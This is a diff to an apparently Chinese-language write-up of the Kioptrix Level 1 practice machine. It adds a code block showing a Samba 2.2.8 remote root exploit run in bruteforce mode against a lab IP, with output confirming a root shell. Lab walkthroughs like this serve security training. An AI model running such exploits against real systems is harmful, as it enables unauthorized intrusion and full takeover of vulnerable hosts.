@@ -115,6 +115,23 @@ Have a nice day!
 
 发现靶机开放了139端口，使用 `msf` 对 smb 服务进行攻击。
 
+```
+
+
+$ ./a.out -b0 10.8.12.128
+samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
+--------------------------------------------------------------
++ Bruteforce mode. (Linux)
++ Host is running samba.
++ Worked!
+--------------------------------------------------------------
+*** JE MOET JE MUIL HOUWE
+Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
+uid=0(root) gid=0(root) groups=99(nobody)
+whoami
+root
+```
+
 ## 总结
 
 ### 知识点
